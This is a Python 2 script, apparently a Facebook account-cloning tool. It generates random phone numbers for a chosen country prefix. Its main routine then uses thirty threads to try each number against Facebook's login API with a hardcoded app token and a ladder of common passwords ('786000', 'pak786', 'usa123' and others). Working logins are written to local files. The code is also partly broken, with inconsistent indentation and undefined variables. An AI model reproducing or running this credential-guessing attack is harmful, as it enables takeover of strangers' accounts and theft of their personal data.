# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(30000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 thug')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders =  [('User-Agent', 'Opera/9.80 (Android; Opera Mini/51.0.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()
	
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
    

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mW\x1b[1;93ma\x1b[1;95mi\x1b[1;96mt\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)
def exxb():
    print '[!] \x1b[1;91m MOST WELL \x1b[3;92;40m COME\x1b[1;95m SO\x1b[1;97mMI \x1b[1;91m\x1b[0;34;40m'
    os.sys.clear()        

back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print """
\033[1;97m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■




"""

####Logo####

logo1 = """
\033[1;97m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;92m██████╗\033[1;93m░██████╗\033[1;91m░░█████╗\033[1;96m░███╗░░██╗\033[1;95m██████╗░
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██╗\033[1;96m████╗░██║\033[1;95m██╔══██╗
\033[1;92m██████╦╝\033[1;93m██████╔╝\033[1;91m███████║\033[1;96m██╔██╗██║\033[1;95m██║░░██║
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██║\033[1;96m██║╚████║\033[1;95m██║░░██║
\033[1;92m██████╦╝\033[1;93m██║░░██║\033[1;91m██║░░██║\033[1;96m██║░╚███║\033[1;95m██████╔╝
\033[1;92m╚═════╝\033[1;93m░╚═╝░░╚═╝\033[1;91m╚═╝░░╚═╝\033[1;96m╚═╝░░╚══╝\033[1;95m╚═════╝░
\033[1;97m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
┈┈┈◢▇◣┈┈◢▇◣┈┈┈┈┈┈◢▇◣┈┈◢▇◣┈┈┈
┈┈┈▇▇▇◣◢▇▇▇┈┈┈┈┈┈▇▇▇◣◢▇▇▇┈┈┈
┈┈┈◥▇▇▇▇▇▇◤┈┈┈┈┈┈◥▇▇▇▇▇▇◤┈┈┈
┈┈┈┈◥▇▇▇▇◤┈┈┈┈┈┈┈┈◥▇▇▇▇◤┈┈┈┈
┈┈┈┈┈◥▇▇◤┈┈┈┈┈┈┈┈┈┈◥▇▇◤┈┈┈┈┈
┈┈┈┈┈┈◥◤┈┈┈┈┈┈┈┈┈┈┈┈◥◤┈┈┈┈┈┈

"""
logo2 = """
\033[1;92m░██████╗\033[0;93m░█████╗\033[0;91m░███╗░░░███╗\033[0;96m██╗
\033[1;92m██╔════╝\033[0;93m██╔══██╗\033[0;91m████╗░████║\033[0;96m██║
\033[1;92m╚█████╗\033[0;93m░██║░░██║\033[0;91m██╔████╔██║\033[0;96m██║
\033[1;92m░╚═══██╗\033[0;93m██║░░██║\033[0;91m██║╚██╔╝██║\033[0;96m██║
\033[1;92m██████╔╝\033[0;93m╚█████╔╝\033[0;91m██║░╚═╝░██║\033[0;96m██║
\033[1;92m╚═════╝\033[0;93m░░╚════╝\033[0;91m░╚═╝░░░░░╚═╝\033[0;96m╚═╝
\033[1;90m■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
\033[1;92m██████╗\033[1;93m░██████╗\033[1;91m░░█████╗\033[1;96m░███╗░░██╗\033[1;95m██████╗░
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██╗\033[1;96m████╗░██║\033[1;95m██╔══██╗
\033[1;92m██████╦╝\033[1;93m██████╔╝\033[1;91m███████║\033[1;96m██╔██╗██║\033[1;95m██║░░██║
\033[1;92m██╔══██╗\033[1;93m██╔══██╗\033[1;91m██╔══██║\033[1;96m██║╚████║\033[1;95m██║░░██║
\033[1;92m██████╦╝\033[1;93m██║░░██║\033[1;91m██║░░██║\033[1;96m██║░╚███║\033[1;95m██████╔╝
\033[1;92m╚═════╝\033[1;93m░╚═╝░░╚═╝\033[1;91m╚═╝░░╚═╝\033[1;96m╚═╝░░╚══╝\033[1;95m╚═════╝░

\033[1;97m◣✴▇▇▇\033[1;91m◤▔▔▔▔▔▔▔◥\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;91m◤▔▔▔▔▔▔▔◥\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;93m▏\033[1;91m◥▇◣┊◢▇◤▕\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;93m▏\033[1;91m◥▇◣┊◢▇◤▕\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;94m▏▃▆▅▎▅▆▃▕\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;94m▏▃▆▅▎▅▆▃▕\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;95m▏╱▔▕▎▔▔╲▕\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;95m▏╱▔▕▎▔▔╲▕\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;96m◣◣▃▅▎▅▃◢◢\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;96m◣◣▃▅▎▅▃◢◢\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;93m▇◣◥▅▅▅◤◢▇\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;93m▇◣◥▅▅▅◤◢▇\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;96m▇▇◣╲▇╱◢▇▇\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;96m▇▇◣╲▇╱◢▇▇\033[1;97m▇▇▇✴◢
\033[1;97m◣✴▇▇▇\033[1;91m▇▇▇◣▇◢▇▇▇\033[1;97m▇▇▇\033[1;97m▇▇▇\033[1;91m▇▇▇◣▇◢▇▇▇\033[1;97m▇▇▇✴◢

"""
CorrectUsername = "SO"
CorrectPassword = "Mi"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;92mBRAND NAME\x1b[1;93m►\x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;93mBRAND PASSWORD\x1b[1;92m►\x1b[1;92m")
        if (password == CorrectPassword):
            print"Loading....."+ username #Dev:SOMI
	    time.sleep(1)
            loop = 'false'
        else:
            print "\033[1;90mWrong "
            os.system('xdg-open https://youtu.be/-eHfLvqWoZo')
    else:
        print "\033[1;90mWrong "
        os.system('xdg-open https://youtu.be/-eHfLvqWoZo')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    jalan ('\033[1;30m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█')
    time.sleep(0.05)
    jalan ('\033[0;97m◣1◢\x1b[1;93mNEW \x1b[1;92mSERIES')
    time.sleep(0.05)
    jalan ('\x1b[0;97m◣0◢\033[1;91m ◣Exit◢ ')
    time.sleep(0.05)
    jalan ('\033[1;30m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')
    pilih_login()

def pilih_login():
    bch = raw_input('\n\n \x1b[1;96m►   ')
    if bch == '':
        print '[!] Fill in correctly'
        pilih_login()
    elif bch == '1':
        tik()
    os.system('clear')
    print logo1
    jalan ('\033[0;97m___◣SELECT◢____')
    time.sleep(0.05)
    jalan ('\033[1;97m◣1◢\x1b[1;93mPAKISTAN \033[1;97m◣2◢\x1b[1;93mU.S.A')
    time.sleep(0.05)
    jalan ('\033[1;97m◣3◢\x1b[1;93mINDIA \033[1;97m◣4◢\x1b[1;93mBANGLADESH')
    time.sleep(0.05)
    jalan ('\033[1;97m◣5◢\x1b[1;93mPOLAND\033[1;97m◣6◢\x1b[1;93mINDONESIA')
    time.sleep(0.05)
    jalan ('\033[1;97m◣7◢\x1b[1;93mJAPAN\033[1;97m◣8◢\x1b[1;93mKOREA')
    time.sleep(0.05)
    jalan ('\033[1;97m◣7◢\x1b[1;93mPHILIPINES')
    time.sleep(0.05)
    jalan ('\033[1;97m◣0◢\x1b[1;96mSomi youtube channel')
    time.sleep(0.05)
    print 45*'█'
    action()

def action():
	bch = raw_input('\n\033[1;90m► \033[1;97m')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		tik()
                print (logo1)
		os.system("clear")
		print (logo2)
		jalan('\033[1;97m1::::::::to::::::::49')
		try:
			c = raw_input("\033[1;95m> : ")
			k="03"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
      elif bch =="4":
      	tik()
        print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="5":
      	tik()
        print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
   elif bch =="6":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m81,83,85,84,89,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="7":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	 elif bch =="8":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
		    menu()
	elif bch =="9":
		tik()
		print (logo1)
		os.system("clear")
		print (logo2)
		print("\033[1;93m02, 32, 09,0905,0906,0915,0916,0917 ,0926 ,0927,0935,0936,0937,0945,0953,,0954,0955")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+63"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="0":
		tik()
		os.system('xdg-open https://youtu.be/-eHfLvqWoZo')
		login()
	else:
		print '[!] Fill in correctly'
		action()
	xxx = str(len(id))
	print 45*"\033[1;97m═"
	jalan ('►\033[1;98mTotal Numbers: '+xxx)
	time.sleep(0.05)
	jalan('►\033[1;93mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('►To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 45*"\033[1;97m═"
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Open Now)  ' + k + c + user +  ' ● ' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="bangladesh123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● '+ pass3
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="786000"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass4 
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="usa123"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass5
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass5 
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                else:                                                                                                                                                                 
                                                    pass6="pak786"
                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass6
                                                        okb = open('save/successfull.txt', 'a')
                                                        okb.write(k+c+user+pass6+'\n')
                                                        okb.close()
                                                        oks.append(c+user+pass6)                                                                                                                                                            
                                                    else:                                                                                                                                                  
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass6
                                                            cps = open('save/checkpoint.txt', 'a')
                                                            cps.write(k+c+user+pass6+'\n')
                                                            cps.close()
                                                            cpb.append(c+user+pass6)                                                                                                                               
                                                        else:                                                                                                                                                              
                                                            pass7="usa12345"
                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass7
                                                                okb = open('save/successfull.txt', 'a')
                                                                okb.write(k+c+user+pass7+'\n')
                                                                okb.close()
                                                                oks.append(c+user+pass7)                                                                                                                                                            
                                                            else:                                                                                                                                                  
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass7
                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                    cps.write(k+c+user+pass7+'\n')
                                                                    cps.close()
                                                                    cpb.append(c+user+pass7)                                                                                                                               
                                                                else:                                                                                                                                                              
                                                                    pass8="philippines"
                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass8
                                                                        okb = open('save/successfull.txt', 'a')
                                                                        okb.write(k+c+user+pass8+'\n')
                                                                        okb.close()
                                                                        oks.append(c+user+pass8)                                                                                                                                                            
                                                                    else:                                                                                                                                                  
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass8
                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                            cps.write(k+c+user+pass8+'\n')
                                                                            cps.close()
                                                                            cpb.append(c+user+pass8)                                                                                                                               
                                                                        else:                                                                                                                                                              
                                                                            pass9="japan123"
                                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[1;93m(Aftar 7days)  ' + k + c + user + ' ● ' + pass9
                                                                                okb = open('save/successfull.txt', 'a')
                                                                                okb.write(k+c+user+pass9+'\n')
                                                                                okb.close()
                                                                                oks.append(c+user+pass9)                                                                                                                                                            
                                                                            else:                                                                                                                                                  
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass9
                                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                                    cps.write(k+c+user+pass9+'\n')
                                                                                    cps.close()
                                                                                    cpb.append(c+user+pass9)                                                                                                                               
                                                                                else:                                                                                                                                                              
                                                                                    pass10="usa786"
                                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass10
                                                                                        okb = open('save/successfull.txt', 'a')
                                                                                        okb.write(k+c+user+pass10+'\n')
                                                                                        okb.close()
                                                                                        oks.append(c+user+pass10)                                                                                                                                                            
                                                                                    else:                                                                                                                                                  
                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass10
                                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                                            cps.write(k+c+user+pass10+'\n')
                                                                                            cps.close()
                                                                                            cpb.append(c+user+pass10)                                                                                                                               
                                                                                                                                                   
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            


		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	jalan ('[✓] Process Has Been Completed ....')
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
	
	print """
	_.█████████████████

_ ██████████████████

████████████████████

█████████████████████

_█___________▄▄▄▄_ ▄▄▄▄_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▐▓▓▌_▐▓▓▌_█

_█__█████_▀▀▀▀_ ▀▀▀▀ █✿ ✿

_█__█████_______________ █(\\|/)

_____________██ ______________██

_____________█

______________█

_______________██

_________________██

___________________██

__________________██

_________________███

______________████

___________█████

_________██████

_______██████
"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()

    

 
